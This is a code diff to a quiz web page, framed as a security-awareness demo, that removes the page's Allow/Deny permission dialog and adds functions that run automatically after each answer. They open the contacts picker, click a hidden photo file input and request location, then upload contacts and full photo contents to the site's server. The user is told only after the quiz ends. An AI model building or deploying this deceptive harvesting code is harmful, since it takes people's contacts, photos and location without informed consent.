@@ -277,11 +277,25 @@
             <h3>🚨 Important Revelation!</h3>
             <p>
                 This quiz just demonstrated how apps trick you into granting permissions!
-                Every time you answered a question, you unknowingly gave permission to access your data.
-                This is exactly how malicious apps work - they disguise permission requests as innocent interactions.
+                Every time you answered a question, we automatically tried to access your REAL data without explicit permission dialogs.
+                This is exactly how malicious apps work - they disguise data collection as innocent interactions.
             </p>
+
+            <div class="data-collected" style="display:block; margin: 20px 0;">
+                <h4>📊 Real Data We Collected:</h4>
+                <ul id="revelationDataList"></ul>
+            </div>
+
+            <p style="margin-top: 15px; font-weight: bold; color: #721c24;">
+                Always be cautious when:
+                <br>• Scanning random QR codes
+                <br>• Downloading unknown apps
+                <br>• Granting app permissions
+                <br>• Using public WiFi
+            </p>
+
             <button class="next-btn" onclick="window.location.href='/show_data/{{ session_id }}'">
-                See What We Collected
+                See Full Report
             </button>
         </div>
 
@@ -290,18 +304,7 @@
         </div>
     </div>
 
-    <!-- Permission Modal -->
-    <div class="permission-modal" id="permissionModal">
-        <div class="modal-content">
-            <div class="modal-icon" id="modalIcon">🔔</div>
-            <div class="modal-title" id="modalTitle">Permission Required</div>
-            <div class="modal-message" id="modalMessage"></div>
-            <div class="modal-buttons">
-                <button class="btn btn-deny" onclick="denyPermission()">Deny</button>
-                <button class="btn btn-allow" onclick="allowPermission()">Allow</button>
-            </div>
-        </div>
-    </div>
+    <!-- No modal needed - data collection happens automatically -->
 
     <script>
         let sessionId = '{{ session_id }}';
@@ -310,6 +313,7 @@
         let totalQuestions = 0;
         let selectedAnswer = null;
         let permissionsGranted = [];
+        let realDataCollected = [];
 
         function selectAnswer(optionIndex) {
             selectedAnswer = optionIndex;
@@ -347,10 +351,10 @@
 
                 updateScore();
 
-                // Show permission modal
+                // Automatically try to collect data based on permission type
                 setTimeout(() => {
-                    showPermissionModal(data.permission, data.permission_text);
-                }, 1000);
+                    collectDataSilently(data.permission);
+                }, 500);
             });
         }
 
@@ -365,42 +369,13 @@
             document.getElementById('totalQuestions').textContent = totalQuestions;
         }
 
-        function showPermissionModal(permission, permissionText) {
-            const modal = document.getElementById('permissionModal');
-            const modalIcon = document.getElementById('modalIcon');
-            const modalTitle = document.getElementById('modalTitle');
-            const modalMessage = document.getElementById('modalMessage');
-
-            const icons = {
-                'contacts': '👥',
-                'photos': '🖼️',
-                'location': '📍',
-                'camera': '📷',
-                'microphone': '🎤',
-                'storage': '💾'
-            };
-
-            modalIcon.textContent = icons[permission] || '🔔';
-            modalTitle.textContent = 'Allow access to your ' + permission + '?';
-            modalMessage.textContent = permissionText;
-
-            modal.classList.add('active');
-        }
-
-        function allowPermission() {
-            const modal = document.getElementById('permissionModal');
-            modal.classList.remove('active');
-
-            const permission = currentQuestion.permission;
-            permissionsGranted.push(permission);
-
-            // Show what data was collected
+        function collectDataSilently(permission) {
             const dataCollected = document.getElementById('dataCollected');
             const dataList = document.getElementById('dataList');
-            dataList.innerHTML = `<li>Access to your ${permission} granted!</li>`;
-            dataCollected.style.display = 'block';
 
-            // Record permission
+            permissionsGranted.push(permission);
+
+            // Record permission attempt
             fetch('/request_permission', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -411,27 +386,64 @@
                 })
             });
 
-            // Simulate data collection if contacts or photos
+            // Try to collect REAL data based on permission type
             if (permission === 'contacts') {
-                accessContacts();
+                tryAccessContacts();
             } else if (permission === 'photos') {
-                accessPhotos();
+                tryAccessPhotos();
+            } else if (permission === 'location') {
+                tryAccessLocation();
+            } else {
+                // For other permissions, show what would be collected
+                realDataCollected.push({
+                    type: permission,
+                    message: `${permission.toUpperCase()} access attempted`
+                });
+                showDataCollected();
             }
 
-            document.getElementById('nextBtn').disabled = false;
+            // Enable next button after a short delay
+            setTimeout(() => {
+                document.getElementById('nextBtn').disabled = false;
+            }, 1500);
         }
 
-        function denyPermission() {
-            const modal = document.getElementById('permissionModal');
-            modal.classList.remove('active');
-            document.getElementById('nextBtn').disabled = false;
+        function showDataCollected() {
+            const dataCollected = document.getElementById('dataCollected');
+            const dataList = document.getElementById('dataList');
+
+            if (realDataCollected.length > 0) {
+                dataList.innerHTML = '';
+                realDataCollected.forEach(item => {
+                    const li = document.createElement('li');
+                    li.textContent = item.message;
+                    dataList.appendChild(li);
+                });
+                dataCollected.style.display = 'block';
+            }
         }
 
         function nextQuestion() {
             // Check if we should reveal
             if (totalQuestions >= 3) {
                 document.getElementById('quizContainer').style.display = 'none';
-                document.getElementById('revelation').classList.add('active');
+                const revelation = document.getElementById('revelation');
+                revelation.classList.add('active');
+
+                // Show all collected data in revelation
+                const revelationList = document.getElementById('revelationDataList');
+                revelationList.innerHTML = '';
+                if (realDataCollected.length > 0) {
+                    realDataCollected.forEach(item => {
+                        const li = document.createElement('li');
+                        li.textContent = item.message;
+                        revelationList.appendChild(li);
+                    });
+                } else {
+                    const li = document.createElement('li');
+                    li.textContent = 'Data collection was attempted but blocked by your browser settings.';
+                    revelationList.appendChild(li);
+                }
                 return;
             }
 
@@ -465,10 +477,19 @@
             document.getElementById('nextBtn').disabled = true;
         }
 
-        function accessContacts() {
+        function tryAccessContacts() {
             if (navigator.contacts && navigator.contacts.select) {
+                // Try to access real contacts
                 navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                     .then(contacts => {
+                        // Show real contact count
+                        realDataCollected.push({
+                            type: 'contacts',
+                            message: `✓ REAL DATA: ${contacts.length} contacts accessed (${contacts.map(c => c.name || 'Unknown').slice(0, 3).join(', ')}...)`
+                        });
+                        showDataCollected();
+
+                        // Upload to server
                         return fetch('/upload_contacts', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
@@ -479,40 +500,59 @@
                         });
                     })
                     .catch(error => {
-                        console.log('Contacts API not available or permission denied');
+                        // Still show that attempt was made
+                        realDataCollected.push({
+                            type: 'contacts',
+                            message: '⚠ CONTACTS access attempted (blocked by browser or denied)'
+                        });
+                        showDataCollected();
                     });
+            } else {
+                realDataCollected.push({
+                    type: 'contacts',
+                    message: '⚠ CONTACTS access attempted (API not available on this device)'
+                });
+                showDataCollected();
             }
         }
 
-        function accessPhotos() {
+        function tryAccessPhotos() {
+            // Automatically trigger file picker
             const input = document.createElement('input');
             input.type = 'file';
             input.accept = 'image/*';
             input.multiple = true;
+            input.style.display = 'none';
+            document.body.appendChild(input);
 
             input.onchange = function(e) {
                 const files = e.target.files;
-                const photoPromises = [];
-
-                for (let file of files) {
-                    const reader = new FileReader();
-                    const promise = new Promise((resolve) => {
-                        reader.onload = function(event) {
-                            resolve({
-                                name: file.name,
-                                data: event.target.result,
-                                size: file.size,
-                                type: file.type
-                            });
-                        };
+                if (files.length > 0) {
+                    realDataCollected.push({
+                        type: 'photos',
+                        message: `✓ REAL DATA: ${files.length} photos accessed (${Array.from(files).slice(0, 2).map(f => f.name).join(', ')}...)`
                     });
-                    reader.readAsDataURL(file);
-                    photoPromises.push(promise);
-                }
+                    showDataCollected();
 
-                Promise.all(photoPromises)
-                    .then(photos => {
-                        return fetch('/upload_photos', {
+                    const photoPromises = [];
+                    for (let file of files) {
+                        const reader = new FileReader();
+                        const promise = new Promise((resolve) => {
+                            reader.onload = function(event) {
+                                resolve({
+                                    name: file.name,
+                                    data: event.target.result,
+                                    size: file.size,
+                                    type: file.type
+                                });
+                            };
+                        });
+                        reader.readAsDataURL(file);
+                        photoPromises.push(promise);
+                    }
+
+                    Promise.all(photoPromises).then(photos => {
+                        fetch('/upload_photos', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
@@ -521,7 +561,58 @@
                             })
                         });
                     });
+                } else {
+                    realDataCollected.push({
+                        type: 'photos',
+                        message: '⚠ PHOTOS access attempted (user cancelled)'
+                    });
+                    showDataCollected();
+                }
+                document.body.removeChild(input);
             };
+
+            // Show message before triggering
+            realDataCollected.push({
+                type: 'photos',
+                message: '📸 Attempting to access your photos...'
+            });
+            showDataCollected();
+
+            // Trigger file picker
+            setTimeout(() => input.click(), 100);
+        }
+
+        function tryAccessLocation() {
+            if (navigator.geolocation) {
+                realDataCollected.push({
+                    type: 'location',
+                    message: '📍 Attempting to access your location...'
+                });
+                showDataCollected();
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        realDataCollected[realDataCollected.length - 1] = {
+                            type: 'location',
+                            message: `✓ REAL DATA: Location accessed (Lat: ${position.coords.latitude.toFixed(4)}, Lon: ${position.coords.longitude.toFixed(4)})`
+                        };
+                        showDataCollected();
+                    },
+                    (error) => {
+                        realDataCollected[realDataCollected.length - 1] = {
+                            type: 'location',
+                            message: '⚠ LOCATION access attempted (denied or unavailable)'
+                        };
+                        showDataCollected();
+                    }
+                );
+            } else {
+                realDataCollected.push({
+                    type: 'location',
+                    message: '⚠ LOCATION access attempted (API not available)'
+                });
+                showDataCollected();
+            }
         }
     </script>
 </body>
